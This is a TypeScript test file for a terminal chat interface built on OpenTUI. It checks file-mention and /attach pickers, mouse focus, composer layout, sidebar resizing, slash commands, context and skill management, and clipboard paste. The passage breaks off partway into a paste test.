import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test, { type TestContext } from "node:test";
import { createTestRenderer as createOpenTuiTestRenderer } from "@opentui/core/testing";
import { BoxRenderable, TextRenderable, TextAttributes, parseColor, type ClipboardReadResult, type TextChunk, type Renderable } from "@opentui/core";
import type { ChatClient, OneShotRequest } from "@codehaus-au/ask/internal/chat";
import { TuiChat } from "../../src/chat.ts";
import { mountChatUI, SIDEBAR_MIN_WIDTH, SIDEBAR_MIN_COLUMNS, CHAT_MIN_COLUMNS } from "../../src/ui.ts";
import { ASK_PALETTE, themePalette } from "../../src/themes.ts";

// Match the real entry point: Ctrl+C belongs to the application, not OpenTUI.
const createTestRenderer = (options: Parameters<typeof createOpenTuiTestRenderer>[0]) =>
  createOpenTuiTestRenderer({ ...options, exitOnCtrlC: false });

function popupRows(picker: BoxRenderable): TextRenderable {
  const rows = picker.getChildren().find((child) => child.id === "popup-options");
  assert.ok(rows instanceof TextRenderable);
  return rows;
}

function localClipboardEnvironment(t: TestContext) {
  const keys = ["SSH_CONNECTION", "SSH_TTY"];
  const saved = keys.map((key) => process.env[key]);
  for (const key of keys) delete process.env[key];
  t.after(() => keys.forEach((key, index) => {
    if (saved[index] === undefined) delete process.env[key]; else process.env[key] = saved[index];
  }));
}

async function waitUntilIdle(ui: { readonly working: boolean; readonly pasting?: boolean; readonly loadingSkills?: boolean }) {
  for (let tries = 0; tries < 200 && (ui.working || ui.pasting || ui.loadingSkills); tries++) {
    await new Promise((done) => setTimeout(done, 10));
  }
  assert.equal(ui.working, false, "request/write should complete");
  assert.ok(!ui.pasting, "clipboard read should complete");
  assert.ok(!ui.loadingSkills, "skill discovery should complete");
}

test("mention and /attach browsers hide dot entries until a dot-prefixed filename is requested", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-hidden-files-"));
  const setup = await createTestRenderer({ width: 110, height: 38, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("browsing must not ask the model"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    ui.setCandidates(["normal.ts", "src/normal.ts", ".config/", ".prettierrc", ".config/settings.ts", "src/.config/", "src/.hidden.ts"]);
    async function search(text: string) {
      ui.input.setText(text); ui.input.gotoBufferEnd(); await setup.flush();
      return popupRows(ui.picker).chunks.map((chunk) => chunk.text).join("");
    }
    for (const prefix of ["@", "/attach "]) {
      const initial = await search(prefix);
      assert.match(initial, /normal\.ts/);
      assert.doesNotMatch(initial, /\.config|\.prettierrc|\.hidden/);
      const byName = await search(prefix + "settings");
      assert.doesNotMatch(byName, /\.config\/settings/);
      const dottedExtension = await search(prefix + "normal.ts");
      assert.match(dottedExtension, /normal\.ts/);
      assert.doesNotMatch(dottedExtension, /\.config|\.prettierrc|\.hidden/);
      const rootDots = await search(prefix + ".");
      assert.match(rootDots, /\.config\//);
      assert.match(rootDots, /\.prettierrc/);
      const nestedDots = await search(prefix + "src/.");
      assert.match(nestedDots, /src\/\.config\//);
      assert.match(nestedDots, /src\/\.hidden\.ts/);
      assert.doesNotMatch(await search(prefix + "src/hidden"), /src\/\.hidden/);
    }
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("ordinary clicks focus the prompt while mouse controls retain their actions", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-click-focus-"));
  const setup = await createTestRenderer({ width: 150, height: 38, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("clicking must not submit"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    const answer = new TextRenderable(setup.renderer, { content: "LONG ANSWER line\n".repeat(100), flexShrink: 0, selectable: true });
    ui.transcript.add(answer);
    ui.input.setText("draft"); ui.input.gotoBufferEnd(); await setup.flush();
    for (const [x, y] of [[0, 0], [ui.footerLeft.x + 2, ui.footerLeft.y], [ui.sidebar.x + 3, ui.sidebar.y + 1]]) {
      ui.transcript.focus();
      await setup.mockMouse.click(x!, y!); await setup.flush();
      assert.equal(ui.input.focused, true, "background and read-only text return focus to the prompt");
    }
    const frame = setup.captureCharFrame().split("\n");
    const y = frame.findIndex((line) => line.includes("LONG ANSWER"));
    assert.ok(y >= 0);
    const x = frame[y]!.indexOf("LONG ANSWER");
    ui.transcript.focus();
    await setup.mockMouse.drag(x, y, x + 3, y); await setup.flush();
    assert.equal(ui.input.focused, true);
    assert.ok(setup.renderer.getSelection()?.getSelectedText().includes("LONG"), "text selection remains usable");
    ui.transcript.focus();
    const bar = ui.transcript.verticalScrollBar;
    assert.equal(bar.visible, true);
    await setup.mockMouse.pressDown(bar.x, bar.y + 1); await setup.flush();
    assert.equal(ui.input.focused, false, "scrollbar interaction must retain control");
    await setup.mockMouse.release(bar.x, bar.y + 1);
    ui.transcript.focus();
    await setup.mockMouse.pressDown(ui.sidebarDivider.x, ui.sidebarDivider.y + 2);
    assert.equal(ui.input.focused, false, "divider interaction must not be overridden");
    await setup.mockMouse.release(ui.sidebarDivider.x, ui.sidebarDivider.y + 2); await setup.flush();
    assert.equal(ui.input.plainText, "draft");
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("composer has horizontal padding and half-block caps that track pane and terminal widths", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-composer-padding-"));
  const setup = await createTestRenderer({ width: 100, height: 32, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("layout must not ask the model"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    ui.input.setText("Hello"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.equal(ui.composer.height, 6);
    assert.equal(ui.input.height, 4);
    assert.equal(ui.input.x, ui.composer.x + 3);
    assert.equal(ui.input.y, ui.composer.y + 1);
    assert.equal(ui.input.width, ui.composer.width - 5);
    const inputArea = ui.composer.getChildren().find((child) => child.id === "composer-input-area");
    assert.ok(inputArea instanceof BoxRenderable);
    assert.deepEqual(inputArea.border, ["left"]);
    assert.deepEqual(inputArea.borderColor.toInts(), [130, 207, 255, 255]);
    function assertCaps() {
      const frame = setup.captureCharFrame().split("\n");
      assert.equal(frame[ui.composer.y]!.slice(ui.composer.x, ui.composer.x + ui.composer.width), "▄".repeat(ui.composer.width));
      assert.equal(frame[ui.composer.y + ui.composer.height - 1]!.slice(ui.composer.x, ui.composer.x + ui.composer.width), "▀".repeat(ui.composer.width));
      assert.equal(ui.footerRight.y, ui.composer.y + ui.composer.height);
      assert.equal(ui.footerRight.x + ui.footerRight.width, ui.composer.x + ui.composer.width);
      if (ui.sidebar.visible) assert.ok(ui.footerRight.x + ui.footerRight.width < ui.sidebar.x);
    }
    assertCaps();
    assert.match(setup.captureCharFrame().split("\n")[ui.input.y]!.slice(ui.composer.x), /^│  Hello/);
    ui.input.setText("x".repeat(ui.input.width + 1)); ui.input.gotoBufferEnd(); await setup.flush();
    const wrapped = setup.captureCharFrame().split("\n");
    assert.equal(wrapped[ui.input.y]!.slice(ui.composer.x, ui.input.x), "│  ");
    assert.equal(wrapped[ui.input.y]!.slice(ui.input.x + ui.input.width, ui.composer.x + ui.composer.width), "  ");
    assert.equal(wrapped[ui.input.y + 1]!.slice(ui.input.x, ui.input.x + 1), "x");
    ui.transcript.focus();
    await setup.mockMouse.click(ui.composer.x + 1, ui.composer.y); await setup.flush();
    assert.equal(ui.input.focused, true, "clicking a decorative cap focuses the editor");
    assert.equal(setup.renderer.hasSelection, false);
    setup.resize(180, 38); await setup.flush();
    assertCaps();
    const y = ui.sidebarDivider.y + 2;
    await setup.mockMouse.drag(ui.sidebarDivider.x, y, ui.sidebarDivider.x - 10, y);
    await setup.flush();
    assertCaps();
    ui.setCandidates(["a.ts"]);
    ui.input.setText("@a"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.equal(ui.picker.y + ui.picker.height, ui.composer.y);
    assert.equal(ui.picker.width, ui.composer.width);
    assert.equal(ui.input.plainText, "@a", "decorative characters never enter the prompt");
    assertCaps();
    setup.resize(55, 24); await setup.flush();
    assertCaps();
    assert.equal(ui.input.width, ui.composer.width - 5);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("sidebar divider drags across pane boundaries, clamps safely and remembers session width", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-sidebar-drag-"));
  const setup = await createTestRenderer({ width: 160, height: 40, kittyKeyboard: true, enableMouseMovement: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("resizing must not ask the model"); } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.setCandidates(["src/"]);
    ui.input.setText("keep this draft @src"); ui.input.gotoBufferEnd();
    await setup.flush();
    assert.equal(ui.sidebar.width, 32);
    assert.equal(ui.sidebarDivider.x, ui.sidebar.x, "drag target covers the visible left border");
    assert.equal(ui.sidebarDivider.height, ui.sidebar.height);
    const pointers: string[] = [];
    setup.renderer.setMousePointer = (style) => { pointers.push(style); };
    const x = ui.sidebarDivider.x;
    const y = ui.sidebarDivider.y + 2;
    const composerWidth = ui.input.width;
    await setup.mockMouse.moveTo(x, y); await setup.flush();
    assert.ok(pointers.includes("col-resize"));
    await setup.mockMouse.pressDown(x, y);
    await setup.mockMouse.emitMouseEvent("drag", x - 12, y); await setup.flush();
    assert.equal(ui.sidebar.width, 44);
    assert.equal(ui.input.width, composerWidth - 12);
    await setup.mockMouse.emitMouseEvent("drag", x - 20, y); await setup.flush();
    assert.equal(ui.sidebar.width, 52, "drag continues even outside the original divider bounds");
    await setup.mockMouse.release(x - 20, y); await setup.flush();
    assert.equal(ui.input.focused, true);
    assert.equal(setup.renderer.hasSelection, false, "resizing is not text selection");
    assert.equal(ui.input.plainText, "keep this draft @src");
    assert.equal(ui.picker.width, ui.composer.width);
    assert.equal(ui.footerRight.x + ui.footerRight.width, ui.composer.x + ui.composer.width);
    assert.ok(ui.footerRight.x + ui.footerRight.width < ui.sidebar.x);
    await setup.mockMouse.drag(ui.sidebarDivider.x, y, setup.renderer.width - 2, y);
    await setup.flush();
    assert.equal(ui.sidebar.width, SIDEBAR_MIN_COLUMNS);
    await setup.mockMouse.drag(ui.sidebarDivider.x, y, 1, y);
    await setup.flush();
    const chosen = ui.sidebar.width;
    assert.equal(chosen, 78);
    assert.ok(ui.input.width >= CHAT_MIN_COLUMNS);
    setup.resize(SIDEBAR_MIN_WIDTH, 40); await setup.flush();
    assert.equal(ui.sidebar.width, 51);
    assert.ok(ui.input.width >= CHAT_MIN_COLUMNS);
    setup.resize(SIDEBAR_MIN_WIDTH - 1, 40); await setup.flush();
    assert.equal(ui.sidebar.visible, false);
    assert.equal(ui.composer.width, setup.renderer.width - 2);
    assert.equal(ui.input.width, ui.composer.width - 5);
    setup.resize(200, 40); await setup.flush();
    assert.equal(ui.sidebar.visible, true);
    assert.equal(ui.sidebar.width, chosen, "temporary clamping/hiding must not overwrite the chosen width");
    const before = ui.sidebar.width;
    await setup.mockMouse.moveTo(ui.sidebarDivider.x - 5, y);
    await setup.mockMouse.emitMouseEvent("move", ui.sidebarDivider.x - 10, y);
    await setup.flush();
    assert.equal(ui.sidebar.width, before, "mouse moves after release must not keep resizing");
    assert.ok(pointers.includes("auto"));
    await setup.mockMouse.pressDown(ui.sidebarDivider.x, y);
    await setup.mockMouse.emitMouseEvent("drag", ui.sidebarDivider.x - 5, y); await setup.flush();
    const beforeResize = ui.sidebar.width;
    setup.resize(SIDEBAR_MIN_WIDTH - 1, 40); await setup.flush();
    await setup.mockMouse.emitMouseEvent("drag", 10, y);
    await setup.mockMouse.release(10, y);
    setup.resize(200, 40); await setup.flush();
    assert.equal(ui.sidebar.width, beforeResize, "terminal resizing cancels an active drag safely");
    ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.sidebar.width, beforeResize, "starting a new conversation keeps this run's layout preference");
    assert.equal(chat.sessionStats.turns, 0);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("typing slash queries highlights the best command and Enter uses the current buffer", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-command-ranking-"));
  const setup = await createTestRenderer({ width: 110, height: 35, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd, skillRoots: [cwd] }), "test");
    ui.input.setText("/"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(setup.captureCharFrame(), /› \/context\s/);
    await setup.mockInput.typeText("skil"); await setup.flush();
    assert.match(setup.captureCharFrame(), /› \/skill\s/);
    assert.doesNotMatch(setup.captureCharFrame(), /› \/context\s/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.input.plainText, "/skill ");
    assert.match(setup.captureCharFrame(), /Select skills/);
    for (const command of ["skill", "skills", "attach", "detach", "unskill", "context"]) {
      ui.input.setText("/"); ui.input.gotoBufferEnd(); await setup.flush();
      await setup.mockInput.typeText(command.slice(0, -1));
      setup.mockInput.pressKey(command.at(-1)!);
      setup.mockInput.pressEnter(); // Deliberately no frame/flush after the final character.
      await waitUntilIdle(ui); await setup.flush();
      assert.equal(ui.input.plainText, `/${command} `, `${command} must not execute a stale /context selection`);
    }
    ui.input.setText("/"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressArrow("down"); // Explicit navigation still overrides the default best match.
    setup.mockInput.pressEnter(); await setup.flush();
    assert.equal(ui.input.plainText, "/attach ");
    ui.input.setText("/"); ui.input.gotoBufferEnd(); await setup.flush();
    await setup.mockInput.typeText("help"); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.input.plainText, "");
    assert.match(setup.captureCharFrame(), /Updates only/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("context Add skills/files actions open selectors and attach locally without sending a prompt", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-context-add-"));
  const setup = await createTestRenderer({ width: 110, height: 38, kittyKeyboard: true });
  try {
    await mkdir(path.join(cwd, "skills"));
    await writeFile(path.join(cwd, "skills", "review.md"), "---\nname: review\n---\nREVIEW_INSTRUCTIONS");
    await writeFile(path.join(cwd, "a.ts"), "ATTACHED_CONTENT");
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [path.join(cwd, "skills")] });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.setCandidates(["a.ts"]);
    async function draft(text: string) { ui.input.setText(text); ui.input.gotoBufferEnd(); await setup.flush(); }
    await draft("/context ");
    assert.match(setup.captureCharFrame(), /Add skills/);
    assert.match(setup.captureCharFrame(), /Add files/);
    assert.match(setup.captureCharFrame(), /No skills attached/);
    assert.match(setup.captureCharFrame(), /No files attached/);
    const options = popupRows(ui.picker);
    for (const text of ["Skills", "Files", "No skills attached.", "No files attached."]) {
      const chunk = options.chunks.find((part) => part.text.trim() === text);
      assert.ok(chunk, `missing neutral row: ${text}`);
      assert.deepEqual(chunk.fg?.toInts(), [226, 232, 240, 255]);
    }
    const highlighted = options.chunks.find((part) => part.text.includes("Add skills"));
    assert.deepEqual(highlighted?.fg?.toInts(), [16, 21, 29, 255]);
    assert.deepEqual(highlighted?.bg?.toInts(), [130, 207, 255, 255]);
    assert.deepEqual(options.chunks.find((part) => part.text.includes("Add files"))?.fg?.toInts(), [130, 207, 255, 255]);
    await draft("/context add files"); setup.mockInput.pressEnter(); await setup.flush();
    assert.equal(ui.input.plainText, "/attach ");
    assert.match(setup.captureCharFrame(), /Select files \/ folders/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.attachmentPaths, ["a.ts"]);
    assert.deepEqual(chat.sessionStats.files, ["a.ts"]);
    assert.equal(requests.length, 0, "adding a file is a local action");
    await draft("/context add skills"); setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.match(setup.captureCharFrame(), /Select skills/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.activeSkillNames, ["review"]);
    assert.equal(requests.length, 0, "adding a skill is a local action");
    await draft("/context ");
    assert.match(setup.captureCharFrame(), /Add skills/);
    assert.match(setup.captureCharFrame(), /Add files/);
    assert.doesNotMatch(setup.captureCharFrame(), /No skills attached|No files attached/);
    const list = options.chunks.map((part) => part.text).join("");
    assert.ok(list.indexOf("review") < list.indexOf("Add skills"));
    assert.ok(list.indexOf("@a.ts") < list.indexOf("Add files"));
    setup.mockInput.pressArrow("down"); await setup.flush();
    assert.match(options.chunks.map((part) => part.text).join(""), /› Add skills/);
    setup.mockInput.pressArrow("down"); await setup.flush();
    assert.match(options.chunks.map((part) => part.text).join(""), /› @a\.ts/);
    setup.mockInput.pressArrow("down"); await setup.flush();
    assert.match(options.chunks.map((part) => part.text).join(""), /› Add files/);
    setup.mockInput.pressEscape();
    await draft("Explain the context"); setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    assert.equal(requests.length, 1);
    assert.match(String(requests[0]!.messages.at(-1)!.content), /ATTACHED_CONTENT/);
    assert.match(String(requests[0]!.messages[0]!.content), /REVIEW_INSTRUCTIONS/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("/attach toggles files with Tab/Enter, including individual children of attached folders", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-attach-selection-"));
  const setup = await createTestRenderer({ width: 110, height: 38, kittyKeyboard: true });
  try {
    await mkdir(path.join(cwd, "src"));
    await writeFile(path.join(cwd, "a.ts"), "A_CONTENT");
    await writeFile(path.join(cwd, "name with spaces.ts"), "SPACED_CONTENT");
    await writeFile(path.join(cwd, "src", "b.ts"), "FOLDER_CONTENT");
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } },
      ] };
    } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [] });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.setCandidates(["a.ts", "name with spaces.ts", "src/", "src/b.ts"]);
    ui.input.setText("/attach"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await setup.flush();
    assert.equal(ui.input.plainText, "/attach ");
    setup.mockInput.pressArrow("down"); setup.mockInput.pressTab();
    await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.attachmentPaths, ["name with spaces.ts"]);
    assert.match(setup.captureCharFrame(), /✓ name with spaces\.ts\s+Attached/);
    assert.equal(ui.picker.visible, true);
    assert.equal(ui.input.plainText, "/attach ", "selection does not submit or replace the composer with a question");
    setup.mockInput.pressArrow("up"); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.ok(chat.attachmentPaths.includes("a.ts"));
    assert.match(setup.captureCharFrame(), /✓ a\.ts\s+Attached/);
    ui.input.setText("/attach src"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressTab(); await waitUntilIdle(ui); await setup.flush();
    assert.ok(chat.attachmentPaths.includes("src"));
    assert.ok(chat.sessionStats.files.includes("src/b.ts"));
    assert.match(setup.captureCharFrame(), /✓ src\/\s+Attached/);
    ui.input.setText("/attach name with spaces"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.equal(chat.attachmentPaths.length, 2, "reselecting an attached file detaches it");
    assert.ok(!chat.sessionStats.files.includes("name with spaces.ts"));
    assert.doesNotMatch(setup.captureCharFrame(), /✓ name with spaces/);
    setup.mockInput.pressTab(); await waitUntilIdle(ui); await setup.flush();
    assert.equal(chat.attachmentPaths.length, 3, "Tab can reattach a detached file");
    assert.match(setup.captureCharFrame(), /✓ name with spaces\.ts/);
    ui.input.setText("/attach src/b.ts"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(setup.captureCharFrame(), /✓ src\/b\.ts/);
    setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.ok(chat.attachmentPaths.includes("src"), "the parent folder stays attached");
    assert.deepEqual(chat.excludedFilePaths, ["src/b.ts"]);
    assert.ok(!chat.sessionStats.files.includes("src/b.ts"));
    assert.doesNotMatch(setup.captureCharFrame(), /✓ src\/b\.ts/);
    assert.equal(requests.length, 0);
    setup.mockInput.pressEscape();
    ui.input.setText("Explain"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(requests.length, 1);
    const prompt = String(requests[0]!.messages.at(-1)!.content);
    assert.match(prompt, /A_CONTENT/);
    assert.match(prompt, /SPACED_CONTENT/);
    assert.doesNotMatch(prompt, /FOLDER_CONTENT/, "excluded child must not be sent via the still-attached parent");
    assert.equal(await readFile(path.join(cwd, "src", "b.ts"), "utf8"), "FOLDER_CONTENT", "detaching never deletes the file");
    ui.input.setText("/attach src/b.ts"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressTab(); await waitUntilIdle(ui);
    assert.deepEqual(chat.excludedFilePaths, []);
    assert.equal(requests.length, 1, "reattaching is also local");
    setup.mockInput.pressEscape();
    ui.input.setText("After reattach"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.equal(requests.length, 2);
    assert.match(String(requests[1]!.messages.at(-1)!.content), /FOLDER_CONTENT/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("slash popups search commands and manage files/skills locally, including folder exclusions", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-management-"));
  const setup = await createTestRenderer({ width: 130, height: 42, kittyKeyboard: true });
  try {
    await mkdir(path.join(cwd, "src"));
    await mkdir(path.join(cwd, "skills"));
    for (let index = 0; index < 10; index++) {
      await writeFile(path.join(cwd, "src", `file-${String(index).padStart(2, "0")}.ts`), `FILE_${index}`);
    }
    await writeFile(path.join(cwd, "skills", "alpha.md"), "---\nname: alpha\n---\nALPHA_INSTRUCTIONS");
    await writeFile(path.join(cwd, "skills", "beta.md"), "---\nname: review beta\n---\nBETA_INSTRUCTIONS");
    const requests: OneShotRequest[] = [];
    const client: ChatClient = { chat: { completions: { async create(request) {
      requests.push(request);
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Plain response" } },
      ], usage: { prompt_tokens: 1200, completion_tokens: 40, total_tokens: 1240 } };
    } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [path.join(cwd, "skills")] });
    await chat.selectSkills(["alpha", "review beta"]);
    const ui = mountChatUI(setup.renderer, chat, "test");
    async function draft(text: string) { ui.input.setText(text); ui.input.gotoBufferEnd(); await setup.flush(); }
    await draft("/");
    assert.match(setup.captureCharFrame(), /Commands/);
    assert.match(setup.captureCharFrame(), /\/detach/);
    assert.match(setup.captureCharFrame(), /\/unskill/);
    await setup.mockInput.typeText("remove skill"); await setup.flush();
    assert.match(setup.captureCharFrame(), /\/unskill/);
    assert.doesNotMatch(setup.captureCharFrame(), /\/detach/);
    setup.mockInput.pressEnter(); await setup.flush();
    assert.equal(ui.input.plainText, "/unskill ");
    assert.equal(requests.length, 0, "completion must not ask the model");
    setup.mockInput.pressEscape();
    assert.equal(ui.input.plainText, "");
    await draft("Explain @src"); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(requests.length, 1);
    const user = ui.transcript.getChildren().find((child) => child.id.startsWith("user-"));
    assert.ok(user instanceof BoxRenderable);
    const userBody = user.getChildren().find((child) => child.id.endsWith("-body"));
    assert.ok(userBody instanceof BoxRenderable);
    assert.deepEqual(userBody.border, ["left"]);
    assert.deepEqual(userBody.backgroundColor.toInts(), [27, 37, 51, 255]);
    const userText = userBody.getChildren()[0]!;
    assert.equal(userText.x, user.x + 3);
    assert.equal(userText.width, user.width - 5);
    assert.equal(userText.y, user.y + 1);
    assert.equal(user.height, userText.height + 2);
    assert.doesNotMatch(setup.captureCharFrame(), /^\s*(?:You|Assistant)\s*$/m);
    assert.match(setup.captureCharFrame(), /1\.2K tokens/);
    await draft("/detach ");
    // Navigate past the first page: all attached files must remain reachable.
    for (let index = 0; index < 10; index++) setup.mockInput.pressArrow("down");
    await setup.flush();
    assert.match(setup.captureCharFrame(), /› src\/file-09.ts/);
    setup.mockInput.pressEnter(); await setup.flush();
    assert.deepEqual(chat.excludedFilePaths, ["src/file-09.ts"]);
    assert.equal(requests.length, 1);
    setup.mockInput.pressEscape();
    await draft("Follow up"); setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    assert.doesNotMatch(String(requests[1]!.messages.at(-1)!.content), /FILE_9/);
    await draft("/unskill beta"); setup.mockInput.pressEnter();
    assert.deepEqual(chat.activeSkillNames, ["alpha"]);
    setup.mockInput.pressEscape();
    await draft("/context ");
    assert.match(setup.captureCharFrame(), /Manage context/);
    assert.equal(requests.length, 2);
    await draft("/context restore 09"); setup.mockInput.pressEnter();
    assert.deepEqual(chat.excludedFilePaths, []);
    await draft("/context file-00"); setup.mockInput.pressEnter();
    assert.deepEqual(chat.excludedFilePaths, ["src/file-00.ts"]);
    await draft("/context alpha"); setup.mockInput.pressEnter();
    assert.deepEqual(chat.activeSkillNames, []);
    assert.equal(requests.length, 2, "context manager removals/restores are local");
    setup.mockInput.pressEscape();
    await draft("After management"); setup.mockInput.pressEnter(); await waitUntilIdle(ui);
    assert.match(String(requests[2]!.messages.at(-1)!.content), /FILE_9/);
    assert.doesNotMatch(String(requests[2]!.messages.at(-1)!.content), /FILE_0/);
    assert.doesNotMatch(String(requests[2]!.messages[0]!.content), /ALPHA_INSTRUCTIONS|BETA_INSTRUCTIONS/);
    await draft("/context @src"); setup.mockInput.pressEnter();
    assert.deepEqual(chat.attachmentPaths, []);
    assert.equal(await readFile(path.join(cwd, "src", "file-09.ts"), "utf8"), "FILE_9", "detach never deletes source files");
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("Ctrl+V and Command/Super+V paste; Command+C copies without ever exiting", async (t) => {
  localClipboardEnvironment(t);
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-paste-"));
  const setup = await createTestRenderer({ width: 100, height: 32, kittyKeyboard: true, remote: false });
  try {
    let requests = 0;
    let reads = 0;
    let disposed = 0;
    const client: ChatClient = { chat: { completions: { async create() { requests++; throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test", {
      createClipboard: () => ({
        async read() { reads++; return { status: "read", representation: { mimeType: "text/plain;charset=utf-8", bytes: new TextEncoder().encode("line one\nline two") } }; },
        async dispose() { disposed++; },
      }),
    });
    assert.equal(reads, 0, "mounting must not inspect the clipboard");
    ui.input.setText("😀 old end");
    const start = ui.input.editBuffer.measureText("😀 ");
    ui.input.setSelection(start, ui.input.editBuffer.measureText("😀 old"));
    setup.mockInput.pressKey("v", { ctrl: true });
    setup.mockInput.pressKey("v", { ctrl: true });
    await waitUntilIdle(ui);
    assert.equal(reads, 1, "overlapping paste requests are not duplicated");
    assert.equal(ui.input.plainText, "😀 line one\nline two end");
    ui.input.setText(""); ui.input.gotoBufferEnd();
    setup.mockInput.pressKey("v", { super: true }); await waitUntilIdle(ui);
    assert.equal(ui.input.plainText, "line one\nline two");
    assert.equal(reads, 2);
    const copied: string[] = [];
    setup.renderer.copyToClipboardOSC52 = (text) => { copied.push(text); return true; };
    ui.input.setText("copy me"); ui.input.setSelection(0, 4);
    setup.mockInput.pressKey("c", { super: true });
    assert.deepEqual(copied, ["copy"]);
    ui.input.clearSelection(); setup.renderer.clearSelection();
    setup.mockInput.pressKey("c", { super: true });
    assert.equal(setup.renderer.isDestroyed, false, "Command+C without a selection must not exit");
    assert.deepEqual(copied, ["copy"]);
    setup.mockInput.pressKey("v", { meta: true });
    assert.equal(reads, 2, "Alt/Option must not be mistaken for Command");
    ui.input.setText("native: "); ui.input.gotoBufferEnd();
    ui.transcript.focus();
    await setup.mockInput.pasteBracketedText("two\nlines");
    assert.equal(ui.input.plainText, "native: two\nlines", "terminal-handled Command+V pastes once into the composer");
    assert.equal(reads, 2, "native paste must not read the clipboard again");
    assert.equal(requests, 0, "multiline paste never sends the prompt");
    await setup.dispose();
    assert.equal(disposed, 1);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

for (const method of ["native", "ctrl", "super"] as const) {
  test(`${method} paste preserves mentions and attaches files only on submission`, async (t) => {
    localClipboardEnvironment(t);
    const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-pasted-mentions-"));
    const setup = await createTestRenderer({ width: 110, height: 35, kittyKeyboard: true, remote: false });
    try {
      await writeFile(path.join(cwd, "a.ts"), "FIRST_ATTACHMENT");
      await writeFile(path.join(cwd, "b c.ts"), "SECOND_ATTACHMENT");
